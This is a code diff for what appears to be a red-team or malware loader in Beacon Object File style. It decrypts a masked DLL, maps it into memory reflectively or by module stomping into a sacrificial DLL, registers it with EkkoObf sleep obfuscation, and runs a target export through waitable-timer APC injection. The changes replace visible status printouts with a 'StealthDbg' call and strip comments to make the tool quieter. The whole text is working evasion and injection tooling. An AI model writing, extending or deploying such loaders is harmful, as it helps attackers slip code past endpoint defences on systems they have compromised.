@@ -18,7 +18,6 @@
         }                                                         \
     } while (0)
 
-// Professional logic: Use a static mapping to handle all 8 combinations of R/W/X
 static const DWORD ProtectionMap[8] = {
     PAGE_NOACCESS,          // 000: None
     PAGE_EXECUTE,           // 001: E
@@ -31,7 +30,6 @@ static const DWORD ProtectionMap[8] = {
 };
 
 DWORD GetWin32Protection(DWORD Characteristics) {
-    // Extract the R/W/X bits (bits 29, 30, 31) and map to 0-7 index
     int index = 0;
     if (Characteristics & IMAGE_SCN_MEM_EXECUTE) index |= 1;
     if (Characteristics & IMAGE_SCN_MEM_READ)    index |= 2;
@@ -56,11 +54,11 @@ void fix_section_permissions(DLLDATA *dll, char *base_addr) {
         DWORD old_prot = 0;
 
         if (!KERNEL32$VirtualProtect(target_ptr, size, new_prot, &old_prot)) {
-            MSVCRT$printf("[!] Failed: Section %-8.8s (Error: %lu)\n", section->Name, KERNEL32$GetLastError());
+            StealthDbg("Failed: Section %-8.8s (Error: %lu)\n", section->Name, KERNEL32$GetLastError());
             continue;
         }
 
-        MSVCRT$printf("[+] Section %-8.8s | Prot: 0x%02lX | Addr: %p\n", section->Name, new_prot, target_ptr);
+        StealthDbg("Section %-8.8s | Prot: 0x%02lX | Addr: %p\n", section->Name, new_prot, target_ptr);
     }
 }
 
@@ -84,16 +82,14 @@ void ExecuteViaWaitableTimer(_GetVersions pGetVersions) {
 
     APC_CALLBACK_CTX ctx = { .fn = pGetVersions, .event = hEvent };
     
-    // Set timer to fire "immediately" (100ns relative time)
     LARGE_INTEGER liDueTime;
     liDueTime.QuadPart = -1; 
 
-    MSVCRT$printf("[loader] Setting Waitable Timer for APC injection...\n");
+    StealthDbg("Setting Waitable Timer for APC injection...\n");
 
     if (KERNEL32$SetWaitableTimer(hTimer, &liDueTime, 0, TimerAPCProc, &ctx, FALSE)) {        
-        // Wait for our event to ensure the function actually finished
         KERNEL32$WaitForSingleObject(hEvent, 500);
-        MSVCRT$printf("[loader] APC execution completed successfully.\n");
+        StealthDbg("APC execution completed successfully.\n");
     }
 
     KERNEL32$CloseHandle(hTimer);
@@ -109,7 +105,7 @@ void go(void)
     /* get the pico */
     char * pico_src = GETRESOURCE ( _PICO_ );
     PICO* pico_dst = NULL;
-    
+#if MODE_STOMP
     PICO_ARGS picoArgs;
     picoArgs.funcs = &funcs;
     picoArgs.pico_src = pico_src;
@@ -120,22 +116,32 @@ void go(void)
     stompArgs.resourceType = rPICO;
     stompArgs.picoArgs = picoArgs;
 
-    MSVCRT$printf("[loader] calling Stomp to load PICO code into sacrificial DLL...\n");
+    StealthDbg("calling Stomp to load PICO code into sacrificial DLL...\n");
 
     if ( !Stomp(stompArgs) ) {
-        MSVCRT$printf("[loader] ERROR: Stomp failed\n");
+        StealthDbg("ERROR: Stomp failed\n");
         return;
     }
+#else
+    	/* allocate memory for it */
+    pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
+    /* load it into memory */
+    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );
+
+    /* make code section RX */
+    DWORD old_protect;
+    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );
+
+#endif
     // /* call setup_hooks to overwrite funcs.GetProcAddress */
     ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );
 
-    MSVCRT$printf("[loader] setup_hooks called, proceeding to load and fixup DLL...\n");
+    StealthDbg("setup_hooks called, proceeding to load and fixup DLL...\n");
 
     RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
     RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );
                                                      
-    /* now we can load the DLL */
     /* allocate some temporary memory */
     char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
 
@@ -144,7 +150,7 @@ void go(void)
 
     DLLDATA dll_data;
     ParseDLL(dll_src, &dll_data);
-    
+#if MODE_STOMP
     MSVCRT$memset( &stompArgs, 0, sizeof(stompArgs) );
 
     char* dll_dst = NULL;
@@ -159,23 +165,30 @@ void go(void)
     stompArgs.dllArgs = dllArgs;
 
     if ( !Stomp( stompArgs ) ) {
-        MSVCRT$printf("[loader] ERROR: StompDLL failed\n");
+        StealthDbg("ERROR: StompDLL failed\n");
         KERNEL32$VirtualFree(dll_src, 0, MEM_RELEASE);
         return;
     }
+#else
+    char * dll_dst = KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll_data ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );
+    if (!dll_dst) {
+        StealthDbg("ERROR: Failed to allocate memory for DLL (Error: %lu)\n", KERNEL32$GetLastError());
+        SAFE_FREE(dll_src, masked_dll->len);
+        return;
+    }
+    LoadDLL ( &dll_data, dll_src, dll_dst );
 
+    ProcessImports ( &funcs, &dll_data, dll_dst );
+#endif
     /* wipe and free the unmasked DLL copy — only dll_dst is needed from here */
     SAFE_FREE(dll_src, masked_dll->len);
-
     /* re-parse from the mapped image since dll_src is gone */
     ParseDLL ( dll_dst, &dll_data );
 
     /* tell the PICO (EkkoObf) which region is the DLL image */
     ( ( SET_IMAGE_INFO ) PicoGetExport ( pico_src, pico_dst->code, __tag_set_image_info ( ) ) ) ( dll_dst, SizeOfDLL(&dll_data) );
 
-    // KERNEL32$VirtualProtect ( pText,  textSize, PAGE_EXECUTE_READ, &old_protect );
-
-    MSVCRT$printf ( "[loader] fixing section permissions...\n" );
+    StealthDbg ( "fixing section permissions...\n" );
     fix_section_permissions(&dll_data, dll_dst);
 
     /* protect the PE header page as read-only */
@@ -183,7 +196,7 @@ void go(void)
     KERNEL32$VirtualProtect ( dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect );
 	KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));
 
-    MSVCRT$printf ( "[loader] calling entry point...\n" );
+    StealthDbg ( "calling entry point...\n" );
     DLLMAIN_FUNC entry_point = EntryPoint(&dll_data, dll_dst);
     entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);
 
@@ -193,9 +206,9 @@ void go(void)
     _GetVersions pGetVersions = (_GetVersions)GetExport(dll_dst, targetFunc);
     if (pGetVersions)
     {
-        MSVCRT$printf("[loader] Executing target function via Waitable Timer APC...\n");
+        StealthDbg("Executing target function via Waitable Timer APC...\n");
         ExecuteViaWaitableTimer(pGetVersions);
     } else {
-        MSVCRT$printf("[loader] ERROR: Failed to find target function in loaded DLL.\n");
+        StealthDbg("ERROR: Failed to find target function in loaded DLL.\n");
     }
 }
